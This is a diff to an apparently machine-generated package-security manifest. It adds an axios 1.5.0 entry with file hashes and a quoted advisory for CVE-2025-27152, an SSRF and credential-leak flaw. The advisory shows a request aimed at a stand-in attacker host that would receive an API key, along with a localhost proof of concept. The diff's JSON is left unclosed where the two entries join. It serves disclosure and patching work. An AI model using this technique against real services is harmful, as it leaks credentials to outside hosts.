@@ -24,6 +24,50 @@
       "tier": "free"
     },
     "pkg:npm/axios@1.5.0": {
+      "uuid": "81bf1501-cd18-49c3-a84c-21ae42ca7f7c",
+      "exportedAt": "Fri, 16 Jan 2026 06:47:24 GMT",
+      "files": {
+        "package/dist/axios.js": {
+          "beforeHash": "4cd0299cd85aa249843c49948973570fad3a19a5d8866e7422182916047247f4",
+          "afterHash": "80e50856b0784646a55f8d1a66f056682d4e2ed11de193175579e2fb6a4e89e0"
+        },
+        "package/dist/browser/axios.cjs": {
+          "beforeHash": "6a639c8d1d2330e18c2e02d85a209610ea4d220894d976962b3d0baba04a0735",
+          "afterHash": "92de032fa6018a312edfd19ab418ff2b7b13e3458210b282308b872eb95f7d79"
+        },
+        "package/dist/esm/axios.js": {
+          "beforeHash": "72f8d8a07ea141621990943dae0a59d5d292af5fc8399dee95b7a9c3e575027a",
+          "afterHash": "44c72495e45c6a6f7dbaee1a1519a70249716d7eb441b7c6589c9312f521e30c"
+        },
+        "package/dist/node/axios.cjs": {
+          "beforeHash": "c730ecf81112c446c23e9b2d47594c595aff629224a13cd8257963d55c3cfacf",
+          "afterHash": "8447404939ec673bf66cee17d5d6371fc8f23fd678227b66ab65f15f5018a5a1"
+        },
+        "package/lib/adapters/http.js": {
+          "beforeHash": "7e88b7c96f7f255f8506e23b74df6269f068ef64fb57168594ec29da8308c2fc",
+          "afterHash": "5b3181fbe0405523794fd3efe1cfb6047c71fc74145349dd41fe0f370b62d658"
+        },
+        "package/lib/adapters/xhr.js": {
+          "beforeHash": "e9af6b2eefac2222a33acd225384fff3af979752e6c979189f47d0d68a1565d5",
+          "afterHash": "7651cd7824183cbcf2afb53865f72122ac30c2970b5527dd8324774a15a575ce"
+        },
+        "package/lib/core/Axios.js": {
+          "beforeHash": "119bdd7f65b96da9fcdf41ce43afbedb4f029f43750f05e40016af366a664ca4",
+          "afterHash": "992a55b450004da47a7320f057b01d90fee4c9c419dbc69062da9539139c8c36"
+        },
+        "package/lib/core/buildFullPath.js": {
+          "beforeHash": "629d181f3e36e5a9520f36fbd30db19344e77ab24aa8ec1679389986007e6df7",
+          "afterHash": "b4c600b907327078e52a5687c8b17709e668aeaee42e24a17206e1a0be35e930"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-jr5f-v2jv-69x6": {
+          "cves": [
+            "CVE-2025-27152"
+          ],
+          "summary": "axios Requests Vulnerable To Possible SSRF and Credential Leakage via Absolute URL",
+          "severity": "HIGH",
+          "description": "### Summary\n\nA previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463\n\nA similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios.\n\n### Details\n\nConsider the following code snippet:\n\n```js\nimport axios from \"axios\";\n\nconst internalAPIClient = axios.create({\n  baseURL: \"http://example.test/api/v1/users/\",\n  headers: {\n    \"X-API-KEY\": \"1234567890\",\n  },\n});\n\n// const userId = \"123\";\nconst userId = \"http://attacker.test/\";\n\nawait internalAPIClient.get(userId); // SSRF\n```\n\nIn this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers.\n\nIt is recommended that:\n\n-\tWhen `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`.\n-\tBefore sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`.\n\n### PoC\n\nFollow the steps below to reproduce the issue:\n\n1.\tSet up two simple HTTP servers:\n\n```\nmkdir /tmp/server1 /tmp/server2\necho \"this is server1\" > /tmp/server1/index.html \necho \"this is server2\" > /tmp/server2/index.html\npython -m http.server -d /tmp/server1 10001 &\npython -m http.server -d /tmp/server2 10002 &\n```\n\n\n2.\tCreate a script (e.g., main.js):\n\n```js\nimport axios from \"axios\";\nconst client = axios.create({ baseURL: \"http://localhost:10001/\" });\nconst response = await client.get(\"http://localhost:10002/\");\nconsole.log(response.data);\n```\n\n3.\tRun the script:\n\n```\n$ node main.js\nthis is server2\n```\n\nEven though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`.\n\n### Impact\n\n-\tCredential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed.\n-\tSSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running.\n-\tAffected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue."
       "uuid": "43f4fef1-7abf-4628-b977-512fe7422213",
       "exportedAt": "Thu, 15 Jan 2026 22:50:08 GMT",
       "files": {},
